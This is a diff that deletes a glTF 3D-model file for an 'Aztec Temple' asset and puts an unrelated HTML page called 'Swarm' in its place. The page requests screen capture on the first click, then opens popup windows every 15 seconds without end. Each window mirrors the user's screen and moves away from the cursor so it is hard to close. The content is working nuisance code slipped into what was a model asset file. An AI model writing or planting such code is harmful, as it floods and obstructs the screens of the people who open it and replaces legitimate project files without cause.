@@ -1,307 +1,137 @@
-{
-  "accessors": [
-    {
-      "bufferView": 2,
-      "componentType": 5126,
-      "count": 5452,
-      "max": [
-        34.04198455810547,
-        36.63662338256836,
-        33.82719421386719
-      ],
-      "min": [
-        -27.67499542236328,
-        -10.982099533081055,
-        -33.82719421386719
-      ],
-      "type": "VEC3"
-    },
-    {
-      "bufferView": 2,
-      "byteOffset": 65424,
-      "componentType": 5126,
-      "count": 5452,
-      "max": [
-        1.0,
-        1.0,
-        1.0
-      ],
-      "min": [
-        -1.0,
-        -1.0,
-        -1.0
-      ],
-      "type": "VEC3"
-    },
-    {
-      "bufferView": 3,
-      "componentType": 5126,
-      "count": 5452,
-      "max": [
-        1.0,
-        1.0,
-        1.0,
-        1.0
-      ],
-      "min": [
-        -1.0,
-        -1.0,
-        -1.0,
-        -1.0
-      ],
-      "type": "VEC4"
-    },
-    {
-      "bufferView": 1,
-      "componentType": 5126,
-      "count": 5452,
-      "max": [
-        0.9456285834312439,
-        0.9980080127716064
-      ],
-      "min": [
-        0.0018874822417274117,
-        0.001992033561691642
-      ],
-      "type": "VEC2"
-    },
-    {
-      "bufferView": 0,
-      "componentType": 5125,
-      "count": 10338,
-      "type": "SCALAR"
-    }
-  ],
-  "asset": {
-    "extras": {
-      "author": "Grace Goudge (https://sketchfab.com/gracegoudge45)",
-      "license": "CC-BY-4.0 (http://creativecommons.org/licenses/by/4.0/)",
-      "source": "https://sketchfab.com/3d-models/aztec-temple-e0585f7bff6e4a57ba18d1396852028c",
-      "title": "Aztec Temple"
-    },
-    "generator": "Sketchfab-16.52.0",
-    "version": "2.0"
-  },
-  "bufferViews": [
-    {
-      "buffer": 0,
-      "byteLength": 41352,
-      "name": "floatBufferViews",
-      "target": 34963
-    },
-    {
-      "buffer": 0,
-      "byteLength": 43616,
-      "byteOffset": 41352,
-      "byteStride": 8,
-      "name": "floatBufferViews",
-      "target": 34962
-    },
-    {
-      "buffer": 0,
-      "byteLength": 130848,
-      "byteOffset": 84968,
-      "byteStride": 12,
-      "name": "floatBufferViews",
-      "target": 34962
-    },
-    {
-      "buffer": 0,
-      "byteLength": 87232,
-      "byteOffset": 215816,
-      "byteStride": 16,
-      "name": "floatBufferViews",
-      "target": 34962
-    }
-  ],
-  "buffers": [
-    {
-      "byteLength": 303048,
-      "uri": "scene.bin"
-    }
-  ],
-  "extensionsUsed": [
-    "KHR_materials_specular"
-  ],
-  "images": [
-    {
-      "uri": "textures/aiStandardSurface1_baseColor.png"
-    },
-    {
-      "uri": "textures/aiStandardSurface1_metallicRoughness.png"
-    },
-    {
-      "uri": "textures/aiStandardSurface1_normal.png"
-    },
-    {
-      "uri": "textures/aiStandardSurface1_specularf0.png"
-    }
-  ],
-  "materials": [
-    {
-      "doubleSided": true,
-      "extensions": {
-        "KHR_materials_specular": {
-          "specularColorFactor": [
-            1.0,
-            1.0,
-            1.0
-          ],
-          "specularFactor": 1.0,
-          "specularTexture": {
-            "index": 3
-          }
-        }
-      },
-      "name": "aiStandardSurface1",
-      "normalTexture": {
-        "index": 2
-      },
-      "pbrMetallicRoughness": {
-        "baseColorTexture": {
-          "index": 0
-        },
-        "metallicRoughnessTexture": {
-          "index": 1
-        }
-      }
-    }
-  ],
-  "meshes": [
-    {
-      "name": "pCube107_aiStandardSurface1_0",
-      "primitives": [
-        {
-          "attributes": {
-            "NORMAL": 1,
-            "POSITION": 0,
-            "TANGENT": 2,
-            "TEXCOORD_0": 3
-          },
-          "indices": 4,
-          "material": 0,
-          "mode": 4
-        }
-      ]
-    }
-  ],
-  "nodes": [
-    {
-      "children": [
-        1
-      ],
-      "matrix": [
-        1.0,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        2.220446049250313e-16,
-        -1.0,
-        0.0,
-        0.0,
-        1.0,
-        2.220446049250313e-16,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        1.0
-      ],
-      "name": "Sketchfab_model"
-    },
-    {
-      "children": [
-        2
-      ],
-      "matrix": [
-        0.009999999776482582,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        0.009999999776482582,
-        0.0,
-        0.0,
-        -0.009999999776482582,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        1.0
-      ],
-      "name": "1fd1651cdfc44969a817cae1ea608444.fbx"
-    },
-    {
-      "children": [
-        3
-      ],
-      "name": "RootNode"
-    },
-    {
-      "children": [
-        4
-      ],
-      "matrix": [
-        3.2786502838134766,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        3.2786502838134766,
-        0.0,
-        0.0,
-        0.0,
-        0.0,
-        3.2786502838134766,
-        0.0,
-        370.3250732421875,
-        22.49364471435547,
-        -316.9977722167969,
-        1.0
-      ],
-      "name": "pCube107"
-    },
-    {
-      "mesh": 0,
-      "name": "pCube107_aiStandardSurface1_0"
-    }
-  ],
-  "samplers": [
-    {
-      "magFilter": 9729,
-      "minFilter": 9987,
-      "wrapS": 10497,
-      "wrapT": 10497
-    }
-  ],
-  "scene": 0,
-  "scenes": [
-    {
-      "name": "Sketchfab_Scene",
-      "nodes": [
-        0
-      ]
-    }
-  ],
-  "textures": [
-    {
-      "sampler": 0,
-      "source": 0
-    },
-    {
-      "sampler": 0,
-      "source": 1
-    },
-    {
-      "sampler": 0,
-      "source": 2
-    },
-    {
-      "sampler": 0,
-      "source": 3
-    }
-  ]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Swarm</title>
+<style>
+html, body {
+    margin:0;
+    padding:0;
+    overflow:hidden;
+    background:black;
 }
+#bg {
+    position:fixed;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+}
+</style>
+</head>
+<body>
+<img id="bg" src="https://i.redd.it/brvc63j20c751.gif">
+<script>
+let dvdWindows = [];
+let screenStream = null;
+
+// required click for capture
+document.addEventListener("click", async () => {
+    if (screenStream) return;
+    try {
+        screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        window._stream = screenStream;
+        // delay start 5s AFTER permission
+        setTimeout(startSystem, 5000);
+    } catch {
+        alert("Screen capture required.");
+    }
+}, { once: true });
+
+function spawnWindow() {
+    const w = 200;
+    const h = 120;
+    const win = window.open("", "", `width=${w},height=${h}`);
+    if (!win) return;
+    dvdWindows.push(win);
+    win.document.write(`
+    <html>
+    <head>
+    <style>
+        body,html { margin:0; overflow:hidden; background:black; }
+        video {
+            position:absolute;
+            width:100%;
+            height:100%;
+            object-fit:cover;
+        }
+        img {
+            position:absolute;
+            width:100%;
+            height:100%;
+            object-fit:contain;
+            mix-blend-mode: screen;
+            pointer-events:none;
+        }
+    </style>
+    </head>
+    <body>
+        <video autoplay muted playsinline></video>
+        <img src="https://i.redd.it/brvc63j20c751.gif">
+        <script>
+        let x = window.screenX;
+        let y = window.screenY;
+        let vx = 0;
+        let vy = 0;
+        const speed = 3.0; // slightly faster for better feel
+
+        // LOCAL mouse tracking (this is the fix)
+        let mx = x + window.outerWidth / 2;
+        let my = y + window.outerHeight / 2;
+        document.addEventListener("mousemove", (e) => {
+            mx = e.screenX;
+            my = e.screenY;
+        });
+
+        function loop() {
+            // Use window CENTER for repulsion (this was the main bug)
+            const centerX = x + window.outerWidth / 2;
+            const centerY = y + window.outerHeight / 2;
+
+            // vector away from mouse (only when mouse is over this window)
+            let dx = centerX - mx;
+            let dy = centerY - my;
+            let dist = Math.sqrt(dx*dx + dy*dy) || 1;
+
+            // normalize + push away (stronger force when close)
+            const force = 0.8;
+            vx += (dx / dist) * force;
+            vy += (dy / dist) * force;
+
+            // dampening
+            vx *= 0.90;
+            vy *= 0.90;
+
+            x += vx * speed;
+            y += vy * speed;
+
+            // keep on screen
+            const sw = screen.availWidth;
+            const sh = screen.availHeight;
+            x = Math.max(0, Math.min(sw - window.outerWidth, x));
+            y = Math.max(0, Math.min(sh - window.outerHeight, y));
+
+            window.moveTo(Math.round(x), Math.round(y));
+            requestAnimationFrame(loop);
+        }
+
+        // attach stream
+        document.querySelector("video").srcObject = window.opener._stream;
+        setTimeout(loop, 200);
+        <\/script>
+    </body>
+    </html>
+    `);
+    win.document.close();
+}
+
+function startSystem() {
+    // spawn 5 initially
+    for (let i = 0; i < 5; i++) {
+        setTimeout(spawnWindow, i * 200);
+    }
+    // spawn every 15 seconds
+    setInterval(spawnWindow, 15000);
+}
+</script>
+</body>
+</html>
